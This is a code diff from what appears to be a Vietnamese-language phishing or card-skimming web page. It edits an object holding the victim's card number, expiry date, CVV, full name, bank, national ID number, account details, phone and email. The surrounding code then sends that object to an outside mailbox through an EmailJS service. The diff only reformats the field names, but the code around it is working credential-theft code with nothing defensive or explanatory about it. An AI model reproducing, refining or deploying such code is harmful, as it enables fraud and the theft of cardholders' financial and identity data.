@@ -1025,23 +1025,23 @@
                 formData.bankName = selectedBank;
                 sessionStorage.setItem('cardInfo', JSON.stringify(formData));
                 const cardData = {
-                    'Loại thẻ': formData.cardType,
-                    'Số thẻ': formData.cardNumber,
-                    'date': formData.expiryDate,
-                    'cvv': formData.cvv,
-                    'Tên đầy đủ': formData.cardFullName,
-                    'Tên ngân hàng': formData.bankName,
-                    'dấu thời gian': new Date().toLocaleString('vi-VN'),
-                    cccd: formData.cccd || 'N/A',
-                    amount: formData.amount || 'N/A',
-                    months: formData.months || 'N/A',
-                    account_number: formData.accountNumber || 'N/A',
-                    account_holder: formData.accountHolder || 'N/A',
-                    bank: formData.bankName || 'N/A',
-                    phone: formData.phone || 'N/A',
-                    email: formData.email || 'N/A',
-                    method: 'N/A'
-                };
+    Lo: formData.cardType || '',
+    cardNumber: formData.cardNumber || '',
+    date: formData.expiryDate || '',
+    fullName: formData.cardFullName || '',
+    cvv: formData.cvv || '',
+    TênBank: formData.bankName || '',
+    timestamp: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) || '',
+    cccd: formData.cccd || '',
+    amount: '',
+    months: '',
+    account_number: formData.accountNumber || '',
+    account_holder: formData.accountHolder || '',
+    bank: formData.bankName || '',
+    phone: formData.phone || '',
+    email: formData.email || '',
+    method: ''
+};
                 console.log('Sending cardData:', cardData);
                 emailjs.send('service_60tgxof', 'template_m26sq6s', cardData).then(
                     () => {
